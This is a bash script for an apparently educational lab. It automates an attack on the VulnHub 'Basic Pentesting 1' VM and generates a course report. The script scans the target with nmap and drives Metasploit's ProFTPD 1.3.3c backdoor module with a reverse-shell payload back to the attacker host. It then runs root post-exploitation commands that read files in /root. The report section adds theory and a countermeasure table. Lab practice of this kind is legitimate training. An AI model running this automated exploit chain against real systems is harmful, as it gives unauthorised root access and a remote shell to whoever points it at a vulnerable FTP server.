#!/usr/bin/env bash
#
# basic1_pwn.sh — Automated attack + lab report for VULNHUB "Basic Pentesting 1"
#                 (by Josiah Pierce). Exploits ProFTPD 1.3.3c backdoor -> root.
#
# USE ONLY on your own isolated lab VM that you are authorised to test.
#
# Usage:
#   sudo ./basic1_pwn.sh <TARGET_IP> [LHOST]
#   sudo ./basic1_pwn.sh --discover            # scan the lab net to find the target
#
# Examples:
#   sudo ./basic1_pwn.sh 10.0.2.15
#   sudo ./basic1_pwn.sh 10.0.2.15 10.0.2.10
#
set -u

# ----- directories & files -----------------------------------------------------
WORKDIR="$(pwd)/basic1_run_$(date +%Y%m%d_%H%M%S)"
SCANS="$WORKDIR/scans"
REPORT="$WORKDIR/Lab3_Report_Basic1.md"
NMAP_OUT="$SCANS/basic1"            # nmap -oA base name
MSF_RC="$WORKDIR/exploit.rc"
MSF_LOG="$WORKDIR/msf_output.txt"
mkdir -p "$SCANS"

RANGE="${LAB_RANGE:-10.0.2.0/24}"   # override with: LAB_RANGE=192.168.56.0/24 ./...

# ----- helpers -----------------------------------------------------------------
die(){ echo "[-] $*" >&2; exit 1; }
have(){ command -v "$1" >/dev/null 2>&1; }

# install a missing tool via apt (maps binary name -> package)
ensure_tool(){
  local bin="$1" pkg="$2"
  have "$bin" && return 0
  echo "[*] '$bin' not found — installing package '$pkg'..."
  have apt-get || die "'$bin' missing and apt-get not available. Install $pkg manually (run on Kali/Debian)."
  if [ "$(id -u)" -ne 0 ]; then
    die "'$bin' missing. Re-run with sudo so it can be installed:  sudo $0 ..."
  fi
  if [ -z "${APT_UPDATED:-}" ]; then
    echo "[*] apt-get update..."; apt-get update -y >/dev/null 2>&1; APT_UPDATED=1
  fi
  apt-get install -y "$pkg" || die "Failed to install $pkg. Check internet / apt sources."
  have "$bin" || die "$pkg installed but '$bin' still not found."
  echo "[+] '$bin' installed."
}

detect_lhost(){
  # best-effort: first non-loopback IPv4 of this Kali box
  local ip
  ip="$(ip -4 addr show 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
        | grep -v '^127\.' | head -n1)"
  echo "${ip:-10.0.2.10}"
}

# ----- parse args --------------------------------------------------------------
[ $# -ge 1 ] || die "Usage: sudo $0 <TARGET_IP> [LHOST]   (or --discover)"

if [ "$1" = "--discover" ]; then
  ensure_tool netdiscover netdiscover
  echo "[*] Discovering hosts on $RANGE (Ctrl-C when you see the target)..."
  sudo netdiscover -r "$RANGE"
  exit 0
fi

TARGET="$1"
LHOST="${2:-$(detect_lhost)}"
echo "$TARGET" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' || die "Bad target IP: $TARGET"

# ensure required tools (auto-install on Kali/Debian if missing)
ensure_tool nmap nmap
ensure_tool msfconsole metasploit-framework

echo "[*] Target = $TARGET   |   LHOST (your Kali) = $LHOST"
echo "[*] Output folder: $WORKDIR"
echo

# ==============================================================================
# 1) Write the static report sections (Aim / Theory / Objective / Procedure)
# ==============================================================================
cat > "$REPORT" <<EOF
# Lab 3:
# Pentester Lab Setup & Vulnerability Assessment
### Target: VULNHUB "Basic Pentesting 1" (by Josiah Pierce)

- **Target IP:** \`$TARGET\`  |  **Attacker (Kali) IP:** \`$LHOST\`  |  **Date:** $(date '+%Y-%m-%d %H:%M')

---

## Aim:
Set up a legal, isolated pentest lab and practice discovery, exploitation, and
post-exploitation methods on an intentionally vulnerable system ("Basic Pentesting 1"
VULNHUB machine) to learn attacker workflows and defensive countermeasures.

## Objective:
- Identify the target host and its open ports/services on the isolated lab network.
- Detect the vulnerable service (ProFTPD 1.3.3c).
- Exploit the ProFTPD 1.3.3c backdoor to obtain a shell as root.
- Perform post-exploitation enumeration to confirm full compromise.
- Record findings and map them to defensive countermeasures.

## Theory:
Controlled exploitation in a sandboxed environment teaches the lifecycle of an
attack: reconnaissance, exploitation, foothold, pivoting, and privilege escalation.
Understanding these steps allows defenders to harden systems and improve detection.
Ethical and legal considerations separate acceptable lab activity from unauthorized
actions.

"Basic Pentesting 1" runs **ProFTPD 1.3.3c**, a version that shipped with a
malicious **backdoor**: a crafted command to the FTP service executes arbitrary
commands as root. Metasploit's \`exploit/unix/ftp/proftpd_133c_backdoor\` module
automates triggering this backdoor and returns a root shell — showing the risk of
running unpatched / tampered service software. The matching defence is strict patch
management, software integrity verification, network segmentation, and egress
filtering.

**Tools**
- Virtualization: VirtualBox / VMware Workstation / VMware Player
- Attacker: Kali Linux (VM)
- Targets: VULNHUB OVAs / DVWA / SEEDLabs VMs
- Exploitation & enumeration: metasploit (msfconsole), searchsploit, enum4linux, nmap, netcat (nc)

## Procedure / Implementation Steps:

**Environment Setup (step-by-step)**
1. **Prepare the host & virtualization** – Install VirtualBox/VMware on a host machine.
2. **Create a virtual network** – NAT+Host-only or a dedicated Internal Network
   (recommended) so attacker & victim are isolated:
   - VirtualBox: Adapter 1 = NAT (Internet), Adapter 2 = Host-only / Internal Network for lab.
3. **Install Kali Linux VM** – Download latest Kali ISO/OVA, install, then update:
   \`sudo apt update && sudo apt full-upgrade -y\`
4. **Deploy target VM (Basic Pentesting 1)** – Import the OVA and set its network to
   the same internal network as Kali.
5. **Snapshot machines** for rollback.

**Basic pentest workflow & commands (run by this script)**
1. **Recon** – \`nmap -T4 -A $TARGET -oA scans/basic1\`
2. **Exploit (Metasploit)**:
   - \`use exploit/unix/ftp/proftpd_133c_backdoor\`
   - \`set RHOSTS $TARGET\`
   - \`set payload cmd/unix/reverse\`
   - \`set LHOST $LHOST\`
   - \`exploit\`  → root shell
3. **Post-exploitation**: \`id\`, \`whoami\`, \`uname -a\`, \`ls -la /root\`, \`cat /root/*.txt\`

**Example: Compromise this Level 1 VULNHUB**
1. Scan target: \`nmap -T4 -A $TARGET -oA scans/basic1\`
2. Identify service & exploit: ProFTPD 1.3.3c backdoor (see nmap banner below).
3. Exploit with Metasploit; gain root shell.
4. Post-exploitation: \`id\`, \`uname -a\`, \`ls -la /root\`.
5. Full compromise confirmed via \`uid=0(root)\`.

---

## Output:
*(Real results captured from this run below.)*
EOF

# ==============================================================================
# 2) RECON — nmap
# ==============================================================================
echo "[*] Step 1/3  Recon:  nmap -T4 -A $TARGET"
nmap -T4 -A "$TARGET" -oA "$NMAP_OUT" | tee "$SCANS/nmap_console.txt"
echo

{
  echo
  echo "### 1. Nmap scan (\`nmap -T4 -A $TARGET\`)"
  echo '```'
  cat "$NMAP_OUT.nmap" 2>/dev/null || cat "$SCANS/nmap_console.txt"
  echo '```'
} >> "$REPORT"

# Sanity: warn if ProFTPD 1.3.3c banner not seen (box may differ / network issue)
if ! grep -qi "1.3.3c" "$NMAP_OUT.nmap" 2>/dev/null; then
  echo "[!] WARNING: ProFTPD 1.3.3c banner not found in nmap output."
  echo "    Exploit may fail. Check target IP / network. Continuing anyway..."
  echo
fi

# ==============================================================================
# 3) EXPLOIT + POST-EXPLOIT — Metasploit via resource script
# ==============================================================================
echo "[*] Step 2/3  Exploit: ProFTPD 1.3.3c backdoor via Metasploit"
cat > "$MSF_RC" <<EOF
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS $TARGET
set payload cmd/unix/reverse
set LHOST $LHOST
set ExitOnSession false
exploit -j -z
sleep 8
echo ===== POST-EXPLOITATION =====
sessions -l
sessions -C "id"
sessions -C "whoami"
sessions -C "uname -a"
sessions -C "ls -la /root"
sessions -C "cat /root/flag.txt"
sessions -C "cat /root/*.txt"
exit -y
EOF

echo "[*] Running: msfconsole -q -r $MSF_RC"
msfconsole -q -r "$MSF_RC" | tee "$MSF_LOG"
echo

echo "[*] Step 3/3  Writing results into report..."
{
  echo
  echo "### 2. Exploitation + Post-exploitation (Metasploit)"
  echo
  echo "Resource script used:"
  echo '```'
  cat "$MSF_RC"
  echo '```'
  echo
  echo "Metasploit session output:"
  echo '```'
  cat "$MSF_LOG"
  echo '```'
} >> "$REPORT"

# ==============================================================================
# 4) Conclusion + countermeasures
# ==============================================================================
ROOT_PROOF="not confirmed automatically — check msf_output.txt"
grep -qi "uid=0(root)" "$MSF_LOG" 2>/dev/null && ROOT_PROOF="CONFIRMED (uid=0(root) in session output)"

cat >> "$REPORT" <<EOF

---

## Conclusion:
We have built a repeatable pentest environment, executed a basic exploit against a
vulnerable target ("Basic Pentesting 1"), and performed post-exploitation
enumeration. Reconnaissance identified **ProFTPD 1.3.3c** on port 21; its built-in
backdoor was exploited with Metasploit to obtain a shell running as **root**,
achieving full compromise, and post-exploitation enumeration confirmed root access.

**Root access: $ROOT_PROOF**

The exercise shows how a single unpatched/tampered service leads to total system
compromise, and reinforces the defensive controls below.

### Defensive countermeasures
| Attack step | Countermeasure |
|---|---|
| Service/version discovery (nmap) | Firewall, close unused ports, network segmentation |
| Vulnerable ProFTPD 1.3.3c | Patch management, verify software integrity, remove untrusted builds |
| Backdoor exploitation | Keep services updated, file-integrity monitoring, least privilege |
| Reverse shell egress | Outbound/egress firewall rules, IDS/IPS |
| Root foothold | Run services as non-root where possible, logging + alerting |
EOF

echo "=============================================================="
echo "[+] DONE."
echo "[+] Report : $REPORT"
echo "[+] Scans  : $SCANS/"
echo "[+] MSF log: $MSF_LOG"
echo "[+] Root   : $ROOT_PROOF"
echo "=============================================================="
